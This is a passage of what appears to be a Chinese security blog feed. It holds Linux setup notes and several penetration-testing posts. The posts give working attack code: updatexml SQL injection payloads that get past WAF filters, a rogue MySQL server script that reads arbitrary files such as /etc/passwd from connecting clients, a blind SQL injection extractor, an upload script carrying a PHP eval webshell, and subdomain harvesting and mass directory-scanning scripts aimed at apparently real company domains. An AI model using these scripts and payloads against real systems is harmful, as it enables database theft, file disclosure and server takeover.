p=proxychains</span><br></pre></td></tr></table></figure></p><p>保存别名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.bashrc</span><br></pre></td></tr></table></figure></p><p>搜寻alias<br>在末尾添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias p=proxychains</span><br></pre></td></tr></table></figure></p><h2 id="设置脚本开机自启动"><a href="#设置脚本开机自启动" class="headerlink" title="设置脚本开机自启动"></a>设置脚本开机自启动</h2><p>①脚本文件必须设置为绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi xxx.sh</span><br><span class="line">cp xxx.sh /etc/profile.d</span><br></pre></td></tr></table></figure></p><p>注意，如果是遇到阻塞进程，将无法开机<br>②rc.local<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /erc/rc.local</span><br></pre></td></tr></table></figure></p><p>在exit前添加代码</p><h2 id="nohup后台运行"><a href="#nohup后台运行" class="headerlink" title="nohup后台运行"></a>nohup后台运行</h2><p>正常，会输出日志到nohup.out<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./program</span><br></pre></td></tr></table></figure></p><p>不输出日志信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./program &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>抓<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/k4ge/k4ge</span><br></pre></td></tr></table></figure></p><p>本地回滚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git</span><br></pre></td></tr></table></figure></p><h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r &quot;copy(&apos;https://install.phpcomposer.com/installer&apos;, &apos;composer-setup.php&apos;);&quot;</span><br><span class="line">php composer-setup.php</span><br></pre></td></tr></table></figure></p><h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><p>卸载已经安装的go<br><code>apt-get remove golang-go</code><br>安装go1.10<br><code>wget https://dl.google.com/go/go1.10.linux-amd64.tar.gz</code><br>解压<br><code>sudo tar zxvf go1.10.linux-amd64.tar.gz -C /usr/local</code><br>配置环境变量<br><code>gedit ~/.bashrc</code><br>添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GOROOT=/usr/local/go</span><br><span class="line">export GOPATH=/home/taoyx/program_develop/go_demo</span><br><span class="line">export PATH=$PATH:$GOPATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure></p><p>保存生效<br><code>source ~/.bashrc</code><br>检查版本和环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go version</span><br><span class="line">go env</span><br></pre></td></tr></table></figure></p><p>测试go程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/program_develop/go_demo/src/hello</span><br><span class="line">go build hello.go</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure></p><p>go脚本文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"> </span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"> </span><br><span class="line">func main() &#123;</span><br><span class="line">fmt.Printf(&quot;hello world\n&quot;)</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p>编译运行go文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go build hello.go</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure></p><h2 id="安装搜狗拼音"><a href="#安装搜狗拼音" class="headerlink" title="安装搜狗拼音"></a>安装搜狗拼音</h2><p>先按这个教程流程走<br><a href="https://blog.csdn.net/u013894834/article/details/60357071" target="_blank" rel="noopener">https://blog.csdn.net/u013894834/article/details/60357071</a><br>在<code>reboot</code><br>最后记得删除源<code>add-apt-repository -f ppa:fcitx-team/nightly</code></p><h2 id="安装java13"><a href="#安装java13" class="headerlink" title="安装java13"></a>安装java13</h2><p>添加库<br><code>add-apt-repository ppa:linuxuprising/java</code><br>更新<br><code>apt-get update</code><br>安装<br><code>apt-get install oracle-java13-installer</code></p><h2 id="安装composer"><a href="#安装composer" class="headerlink" title="安装composer"></a>安装composer</h2><p>下载composer.phar<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://getcomposer.org/composer.phar</span><br></pre></td></tr></table></figure></p><p>添加可执行权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x composer</span><br></pre></td></tr></table></figure></p><p>移动到可执行文件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv composer /usr/local/bin</span><br></pre></td></tr></table></figure></p><p>使用composer查看是否成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Mysql授权用户远程访问&quot;&gt;&lt;a href=&quot;#Mysql授权用户远程访问&quot; class=&quot;headerlink&quot; title=&quot;Mysql授权用户远程访问&quot;&gt;&lt;/a&gt;Mysql授权用户远程访问&lt;/h2&gt;&lt;p&gt;登录Mysql，执行sql语句&lt;br&gt;&lt;figure
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>updatexml injection without concat</title>
    <link href="http://yoursite.com/2019/10/19/updatexml%20injection%20without%20concat/"/>
    <id>http://yoursite.com/2019/10/19/updatexml injection without concat/</id>
    <published>2019-10-19T14:43:12.000Z</published>
    <updated>2019-10-19T14:43:12.164Z</updated>
    
    <content type="html"><![CDATA[<p>updatexml报错原理，updatexml函数第二个参数中存在特殊字符、字母时，会出现报错，报错信息为特殊字符、字母及之后的内容，也就是说如果是以数字开头的，那么数字的信息将会被忽略，如图：<br><img src="/img/1571494698074.png" alt=""><br>既然updatexml函数是从特殊字符、字母后面开始截取的，因而传统的updatexml函数构造利用concat()函数来构造。<br><img src="/img/1571495286162.png" alt=""><br>我们延伸一下，对于waf我们经常会遇见过滤concat函数，那么我们应该怎么绕过？<br>可以利用<code>make_set</code>函数，具体用法我也不太明白，反正能用就是了。payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,make_set(3,&apos;~&apos;,(select user())),1);</span><br></pre></td></tr></table></figure></p><p>在来几组payload，前三组相比上面的有一些缺陷，查询出的字符串必须至少含有一个特殊字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,lpad(&apos;@&apos;,30,(select user())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhostroot@localhostr@&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(1,repeat((select user()),2),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhostroot@localhost&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(1,(select user()),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@localhost&apos;</span><br><span class="line">mysql&gt; select updatexml(1,reverse((select user())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;@toor&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(1,export_set(1|2,&apos;::&apos;,(select user())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;::,::,root@localhost,root@localh&apos;</span><br></pre></td></tr></table></figure></p><p>最后要注意的是，updatexml报错最多只能显示32位，需要配合substr函数来获取数据。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><ul><li><a href="https://xz.aliyun.com/t/2160" target="_blank" rel="noopener">https://xz.aliyun.com/t/2160</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;updatexml报错原理，updatexml函数第二个参数中存在特殊字符、字母时，会出现报错，报错信息为特殊字符、字母及之后的内容，也就是说如果是以数字开头的，那么数字的信息将会被忽略，如图：&lt;br&gt;&lt;img src=&quot;/img/1571494698074.png&quot; al
      
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python脚本(不定时更新)</title>
    <link href="http://yoursite.com/2019/10/18/python%E8%84%9A%E6%9C%AC(%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0)/"/>
    <id>http://yoursite.com/2019/10/18/python脚本(不定时更新)/</id>
    <published>2019-10-18T13:34:27.000Z</published>
    <updated>2019-10-18T13:34:27.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="md5验证码"><a href="#md5验证码" class="headerlink" title="md5验证码"></a>md5验证码</h2><p>python3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"></span><br><span class="line"># MD5截断数值已知 求原始数据</span><br><span class="line"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span><br><span class="line"></span><br><span class="line">def md5(s):  # 计算MD5字符串</span><br><span class="line">    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = &apos;bd5c2&apos;   #已知的md5截断值</span><br><span class="line">md5start = 0   # 设置题目已知的截断位置</span><br><span class="line">md5length = 5</span><br><span class="line"></span><br><span class="line">def findmd5(sss):    # 输入范围 里面会进行md5测试</span><br><span class="line">    key = sss.split(&apos;:&apos;)</span><br><span class="line">    start = int(key[0])   # 开始位置</span><br><span class="line">    end = int(key[1])    # 结束位置</span><br><span class="line">    result = 0</span><br><span class="line">    for i in range(start, end):</span><br><span class="line">        # print(md5(i)[md5start:md5length])</span><br><span class="line">        if md5(str(i)+&apos;Nu1L&apos;)[0:5] == keymd5:            # 拿到加密字符串</span><br><span class="line">            result = i</span><br><span class="line">            print(result)    # 打印</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list=[]  # 参数列表</span><br><span class="line">for i in range(10):   # 多线程的数字列表 开始与结尾</span><br><span class="line">    list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1)))</span><br><span class="line">pool = ThreadPool()    # 多线程任务</span><br><span class="line">pool.map(findmd5, list) # 函数 与参数列表</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure></p><h2 id="mysql客户端任意文件读取"><a href="#mysql客户端任意文件读取" class="headerlink" title="mysql客户端任意文件读取"></a>mysql客户端任意文件读取</h2><p>python2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def my_len(s):</span><br><span class="line">    return chr(len(s)+1)</span><br><span class="line"># linux :</span><br><span class="line">#filestring = &quot;/etc/passwd&quot;</span><br><span class="line"># windows:</span><br><span class="line">#filestring = &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot;</span><br><span class="line">HOST = &quot;0.0.0.0&quot; # open for eeeeveryone! ^_^</span><br><span class="line">PORT = 3306</span><br><span class="line">BUFFER_SIZE = 1024</span><br><span class="line"></span><br><span class="line">#1 Greeting</span><br><span class="line">greeting = &quot;\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span><br><span class="line">#2 Accept all authentications</span><br><span class="line">authok = &quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span><br><span class="line"></span><br><span class="line">#3 Payload</span><br><span class="line">#数据包长度</span><br><span class="line">payloadlen = &quot;\x0c&quot;</span><br><span class="line">padding = &quot;\x00\x00&quot;</span><br><span class="line">payload = payloadlen + padding + &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"># print(&quot;payload1:&quot;+payload)</span><br><span class="line">file = raw_input(&quot;file:&quot;)</span><br><span class="line">l = my_len(file) </span><br><span class="line">payload = l + padding + &quot;\x01\xfb&quot; + file</span><br><span class="line"></span><br><span class="line"># &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line">s.listen(1)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print &apos;Connection from:&apos;, addr</span><br><span class="line">    conn.send(greeting)</span><br><span class="line">    while True:</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        print &quot; &quot;.join(&quot;%02x&quot; % ord(i) for i in data)</span><br><span class="line">        conn.send(authok)</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        print &quot;[*] Payload send!&quot;</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        if not data: break</span><br><span class="line">        print &quot;Data received:&quot;, data</span><br><span class="line">        break</span><br><span class="line">    # Don&apos;t leave the connection open.</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/js/scms.php&quot;;</span><br><span class="line">payload_len = &quot;1\nand\nlength(database())&lt;%d\n#&quot;</span><br><span class="line">payload = &quot;1\nand\nascii(substr(database(),%d,1))&lt;%%d\n#&quot;</span><br><span class="line"></span><br><span class="line">true_str = &quot;20151019102732946.jpg&quot;</span><br><span class="line"></span><br><span class="line">def getOneData(payload,flag=1):</span><br><span class="line">    if flag==1:</span><br><span class="line">        list = range(50)</span><br><span class="line">    else:</span><br><span class="line">        list = range(32,127)</span><br><span class="line">    low = 0</span><br><span class="line">    high = len(list)-1</span><br><span class="line">    while low&lt;=high: </span><br><span class="line">        mid = (int)((low+high)/2)</span><br><span class="line">        guess = list[mid]</span><br><span class="line">        print(list[low],guess,list[high])</span><br><span class="line">        # print((payload % guess).replace(&apos; &apos;,&apos;%0A&apos;))</span><br><span class="line">        data = &#123;&apos;action&apos;:&apos;jssdk&apos;,&apos;pageid&apos;:(payload % guess).replace(&apos; &apos;,&quot;%0A&quot;),&apos;pagetype&apos;:&apos;text&apos;,&#125;</span><br><span class="line">        html = requests.post(url,data).text</span><br><span class="line">        # print(html)</span><br><span class="line">        if true_str in html:</span><br><span class="line">            high = mid - 1</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        if low &gt; high:</span><br><span class="line">            return list[high]</span><br><span class="line"></span><br><span class="line">def getFlag(length,payload):</span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    for l in range(1,length+1):</span><br><span class="line">        payload2 = payload % l</span><br><span class="line">        result += chr(getOneData(payload2,2))</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line">getFlag(getOneData(payload_len),payload)</span><br></pre></td></tr></table></figure><h2 id="python上传文件"><a href="#python上传文件" class="headerlink" title="python上传文件"></a>python上传文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/t/1018/test.php&quot;</span><br><span class="line">files = &#123;</span><br><span class="line">&apos;solution&apos;:(&quot;1.txt&quot;,BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);?&gt;&apos;),&apos;image/png&apos;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text = requests.post(url,files=files).text</span><br><span class="line"></span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure><h2 id="匹配子域名并进行库文件操作"><a href="#匹配子域名并进行库文件操作" class="headerlink" title="匹配子域名并进行库文件操作"></a>匹配子域名并进行库文件操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import pymysql</span><br><span class="line"># 程序功能：将字符串中的域名验证是否重复，再插入数据库中。</span><br><span class="line"></span><br><span class="line"># 输入：字符串，返回：匹配子域名的数组</span><br><span class="line">def getDomain(string):</span><br><span class="line">pattern = re.compile(r&quot;[\w\.]*?\.ymm56\.com|[\w\.]*?\.ymmoa\.com|[\w\.]*?\.56qq\.com|[\w\.]*?\.56qq\.cn&quot;);</span><br><span class="line">result = re.findall(pattern,string)</span><br><span class="line">return result</span><br><span class="line"></span><br><span class="line"># 输入：list，功能：将list中的数据插入到数据库</span><br><span class="line">def insertDB(l):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">for name in l:</span><br><span class="line">try:</span><br><span class="line">cursor.execute(&quot;insert into ymm(name) values (&apos;%s&apos;)&quot; % name)</span><br><span class="line">except:</span><br><span class="line">print(&quot;子域名重复：%s&quot; % name)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"># 输入：表，功能：将表项子域名输出到txt文本中</span><br><span class="line">def file(table):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(&quot;select * from %s&quot; % table)</span><br><span class="line">result = cursor.fetchall()</span><br><span class="line">string = &quot;&quot;</span><br><span class="line">for row in result:</span><br><span class="line">string += row[1] + &quot;.maodou.com&quot; + &quot;\n&quot;</span><br><span class="line">with open(&quot;./%s.txt&quot; % table,&quot;a&quot;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">fp.write(string)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">string = &apos;&apos;&apos;asdf.ymm56.com&apos;&apos;&apos;</span><br><span class="line">insertDB(getDomain(string))</span><br></pre></td></tr></table></figure><h2 id="dirsearch多线程不同域名批量查询"><a href="#dirsearch多线程不同域名批量查询" class="headerlink" title="dirsearch多线程不同域名批量查询"></a>dirsearch多线程不同域名批量查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import time, threading</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def myfunction(domain):</span><br><span class="line">print(&quot;thread %s is running\n&quot; % threading.current_thread().name)</span><br><span class="line">url = &quot;http://&quot; + domain</span><br><span class="line">payload = &quot;python3 /root/tool/dirsearch/dirsearch.py -u %s -e all&gt;%s.txt&quot; % (url,domain)</span><br><span class="line">os.system(payload)</span><br><span class="line">print(&quot;thread %s is ended\n&quot; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">with open(&quot;./ymm.txt&quot;) as fp:</span><br><span class="line">l = fp.readlines()</span><br><span class="line"></span><br><span class="line">for i in range(20,31):</span><br><span class="line">domain = l[i].strip()</span><br><span class="line">t = threading.Thread(target=myfunction,name=domain,args=(domain,)) </span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;md5验证码&quot;&gt;&lt;a href=&quot;#md5验证码&quot; class=&quot;headerlink&quot; title=&quot;md5验证码&quot;&gt;&lt;/a&gt;md5验证码&lt;/h2&gt;&lt;p&gt;python3&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>个人渗透脚本整理</title>
    <link href="http://yoursite.com/2019/10/18/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E8%84%9A%E6%9C%AC%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2019/10/18/个人渗透脚本整理/</id>
    <published>2019-10-18T10:28:25.000Z</published>
    <updated>2019-10-18T10:28:26.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="子域名类"><a href="#子域名类" class="headerlink" title="子域名类"></a>子域名类</h2><h3 id="子域名匹配及后续处理"><a href="#子域名匹配及后续处理" class="headerlink" title="子域名匹配及后续处理"></a>子域名匹配及后续处理</h3><p>有三个函数，第一个函数利用正则匹配re库来对各个网页搜寻到的子域名进行匹配。<br>第二个函数将子域名入库，并进行去重操作。<br>第三个函数将数据库的子域名表导出到文件当中来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import pymysql</span><br><span class="line"># 程序功能：将字符串中的域名验证是否重复，再插入数据库中。</span><br><span class="line"></span><br><span class="line"># 输入：字符串，返回：匹配子域名的数组</span><br><span class="line">def getDomain(string):</span><br><span class="line">pattern = re.compile(r&quot;[\w\.]*?\.ymm56\.com|[\w\.]*?\.ymmoa\.com|[\w\.]*?\.56qq\.com|[\w\.]*?\.56qq\.cn&quot;);</span><br><span class="line">result = re.findall(pattern,string)</span><br><span class="line">return result</span><br><span class="line"></span><br><span class="line"># 输入：list，功能：将list中的数据插入到数据库</span><br><span class="line">def insertDB(l):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">for name in l:</span><br><span class="line">try:</span><br><span class="line">cursor.execute(&quot;insert into ymm(name) values 